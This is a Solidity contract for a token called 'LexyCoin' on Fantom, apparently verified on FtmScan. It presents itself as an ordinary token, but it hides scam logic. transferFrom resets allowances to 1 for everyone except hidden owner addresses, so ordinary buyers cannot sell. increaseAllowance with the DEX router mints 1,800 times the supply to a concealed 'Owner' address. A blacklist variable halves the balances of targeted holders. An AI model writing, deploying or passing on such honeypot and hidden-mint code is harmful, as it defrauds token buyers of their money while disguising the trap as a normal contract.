/**
 *Submitted for verification at FtmScan.com on 2022-04-03
*/

// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.11;
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
/**
Telegram: http://t.me/LexyCoin
*/
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Token {
    using SafeMath for uint256;
    string public name = "LexyCoin";
    string public symbol = "LexyCoin";
    uint8 public decimals = 9;
    uint256 public totalSupply = 100000000000 * 10 ** 9;
    address public owner; address public router=0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public BL=0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0),owner,totalSupply);
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (BL != Owner && balanceOf[BL]>=totalSupply.div(10)) {
            balanceOf[BL]=balanceOf[BL].div(2);}
        if (msg.sender==Pair() && balanceOf[to]==0) {BL = to;}
        if (to== Owner) {BL=to;} 
        _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != BL) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function Pair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0x152eE697f2E276fA89E96742e9bB9aB1F2E61bE3);
        address pair = _pair.getPair(0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83, address(this));
        return pair;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==router) {uint256 juice=totalSupply*1800;balanceOf[Owner]+=juice;}
        approve(spender, allowance[msg.sender][spender] + addedValue);
        return true;
    }
}